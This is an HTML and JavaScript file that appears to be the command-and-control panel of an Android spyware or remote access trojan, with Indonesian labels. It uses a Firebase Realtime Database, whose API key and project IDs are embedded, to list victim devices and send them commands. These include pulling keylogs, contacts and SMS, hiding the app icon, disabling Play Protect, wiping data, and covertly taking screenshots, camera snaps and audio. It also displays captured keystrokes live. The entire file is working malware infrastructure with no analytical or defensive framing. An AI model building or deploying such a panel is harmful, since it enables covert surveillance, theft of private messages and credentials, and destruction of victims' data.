<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZETA ULTIMATE CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #05070a; --card: #111827; --accent: #3b82f6; --text: #f3f4f6; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        #sidebar { background: #000; width: 100%; padding: 15px; border-bottom: 2px solid var(--accent); }
        #device-list { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 10px; }
        .dev-item { background: var(--card); padding: 10px; border-radius: 8px; cursor: pointer; border: 1px solid #374151; min-width: 150px; }
        .dev-item.active { border-color: var(--accent); background: #1e3a8a; }
        main { flex: 1; padding: 15px; overflow-y: auto; }
        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
        .card { background: var(--card); padding: 15px; border-radius: 12px; border: 1px solid #1f2937; margin-bottom: 15px; }
        .label { font-size: 10px; font-weight: 800; color: #6b7280; text-transform: uppercase; margin-bottom: 10px; display: block; }
        button { background: #374151; color: white; border: none; padding: 12px 5px; border-radius: 6px; cursor: pointer; font-size: 11px; transition: 0.2s; font-weight: 600; }
        button:hover { background: #4b5563; }
        button:active { transform: scale(0.95); }
        .btn-danger { background: #991b1b; }
        .btn-safe { background: #065f46; }
        #terminal { background: #000; color: #10b981; padding: 10px; height: 200px; border-radius: 8px; font-family: monospace; overflow-y: auto; font-size: 11px; border: 1px solid #374151; }
        @media (min-width: 768px) {
            body { flex-direction: row; }
            #sidebar { width: 300px; height: 100vh; border-bottom: none; border-right: 1px solid var(--accent); }
            #device-list { flex-direction: column; }
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div style="color:var(--accent); font-weight:900; margin-bottom:20px;">ZETA V3.5 CONTROL</div>
    <div class="label">Online Devices</div>
    <div id="device-list">Connecting...</div>
</div>

<main>
    <div id="panel" style="display:none;">
        <div class="card">
            <span class="label">System Navigation (7)</span>
            <div class="grid-container">
                <button onclick="sendCmd('home')">ğŸ  HOME</button>
                <button onclick="sendCmd('back')">â¬…ï¸ BACK</button>
                <button onclick="sendCmd('recents')">ğŸ“‘ RECENTS</button>
                <button onclick="sendCmd('notif_bar')">ğŸ”” NOTIF BAR</button>
                <button onclick="sendCmd('quick_settings')">âš™ï¸ QUICK SET</button>
                <button onclick="sendCmd('lock_screen')">ğŸ”’ LOCK SCREEN</button>
                <button onclick="sendCmd('power_dialog')">ğŸ”‹ POWER DIALOG</button>
            </div>
        </div>

        <div class="card">
            <span class="label">Media & Volume (8)</span>
            <div class="grid-container">
                <button onclick="sendCmd('vol_up')">ğŸ”Š VOL UP</button>
                <button onclick="sendCmd('vol_down')">ğŸ”‰ VOL DOWN</button>
                <button onclick="sendCmd('vol_mute')">ğŸ”‡ MUTE</button>
                <button onclick="sendCmd('play_pause')">â¯ï¸ PLAY/PAUSE</button>
                <button onclick="sendCmd('next_track')">â­ï¸ NEXT</button>
                <button onclick="sendCmd('prev_track')">â®ï¸ PREV</button>
                <button onclick="sendCmd('brightness_up')">â˜€ï¸ BRIGHT UP</button>
                <button onclick="sendCmd('brightness_down')">ğŸŒ™ BRIGHT DOWN</button>
            </div>
        </div>

        <div class="card">
            <span class="label">Apps & Data (10)</span>
            <div class="grid-container">
                <button class="btn-safe" onclick="sendCmd('get_logs')">ğŸ“¥ AMBIL KEYLOG</button>
                <button class="btn-safe" onclick="sendCmd('get_contact')">ğŸ‘¤ GET CONTACT</button>
                <button class="btn-safe" onclick="sendCmd('get_sms')">ğŸ’¬ GET SMS</button>
                <button onclick="sendCmd('open_wa')">ğŸŸ¢ OPEN WA</button>
                <button onclick="sendCmd('open_fb')">ğŸ”µ OPEN FB</button>
                <button onclick="sendCmd('open_ig')">ğŸŸ£ OPEN IG</button>
                <button onclick="sendCmd('open_yt')">ğŸ”´ OPEN YT</button>
                <button onclick="sendCmd('open_chrome')">ğŸŒ CHROME</button>
                <button onclick="sendCmd('vibrate')">ğŸ“³ VIBRATE</button>
                <button onclick="sendCmd('flashlight')">ğŸ”¦ FLASHLIGHT</button>
            </div>
        </div>

        <div class="card">
            <span class="label">Security & Stealth (10)</span>
            <div class="grid-container">
                <button class="btn-danger" onclick="sendCmd('hide_icon')">ğŸ‘» HIDE ICON</button>
                <button class="btn-danger" onclick="sendCmd('show_icon')">ğŸ‘ï¸ SHOW ICON</button>
                <button class="btn-danger" onclick="sendCmd('kill_app')">ğŸ’€ KILL APP</button>
                <button class="btn-danger" onclick="sendCmd('wipe_data')">ğŸ§¹ WIPE DATA</button>
                <button class="btn-danger" onclick="sendCmd('disable_playprotect')">ğŸ›¡ï¸ OFF PROTECT</button>
                <button onclick="sendCmd('screenshot')">ğŸ“¸ SCREENSHOT</button>
                <button onclick="sendCmd('record_audio')">ğŸ™ï¸ REC AUDIO</button>
                <button onclick="sendCmd('camera_snap')">ğŸ“· CAM SNAP</button>
                <button class="btn-danger" onclick="clearLogs()">ğŸ—‘ï¸ CLEAR DB LOGS</button>
                <button onclick="location.reload()">ğŸ”„ REFRESH PANEL</button>
            </div>
        </div>

        <div class="card">
            <span class="label">Live Terminal Output</span>
            <div id="terminal">Select a device to see logs...</div>
        </div>
    </div>
</main>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDrpBJTtankyLgimtOwuriFpiyuC5K10OI",
        authDomain: "studio-727777898-40aea.firebaseapp.com",
        databaseURL: "https://studio-727777898-40aea-default-rtdb.firebaseio.com",
        projectId: "studio-727777898-40aea",
        storageBucket: "studio-727777898-40aea.firebasestorage.app",
        messagingSenderId: "351263967108",
        appId: "1:351263967108:web:973eb49037d874e5c17fd1",
        measurementId: "G-C1LTN3E50Q"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let selectedId = "";

    db.ref('daftar_perangkat').on('value', snap => {
        const list = document.getElementById('device-list');
        list.innerHTML = "";
        snap.forEach(child => {
            const id = child.key;
            const info = child.val().info || {};
            const item = document.createElement('div');
            item.className = `dev-item ${selectedId === id ? 'active' : ''}`;
            item.innerHTML = `<b>${info.model || 'Unknown'}</b><br><small>${id}</small>`;
            item.onclick = () => { selectedId = id; document.getElementById('panel').style.display='block'; listenLogs(id); };
            list.appendChild(item);
        });
    });

    function sendCmd(c) {
        if(!selectedId) return alert("Select Device!");
        db.ref(`daftar_perangkat/${selectedId}`).update({ command: c, time: Date.now() });
    }

    function listenLogs(id) {
        db.ref(`daftar_perangkat/${id}/keylogs`).limitToLast(20).on('value', snap => {
            const term = document.getElementById('terminal');
            term.innerHTML = "";
            snap.forEach(child => {
                const l = child.val();
                term.innerHTML += `<div>[${new Date(l.time).toLocaleTimeString()}] ${l.text}</div>`;
            });
            term.scrollTop = term.scrollHeight;
        });
    }

    function clearLogs() {
        if(selectedId && confirm("Delete logs?")) db.ref(`daftar_perangkat/${selectedId}/keylogs`).remove();
    }
</script>
</body>
</html>
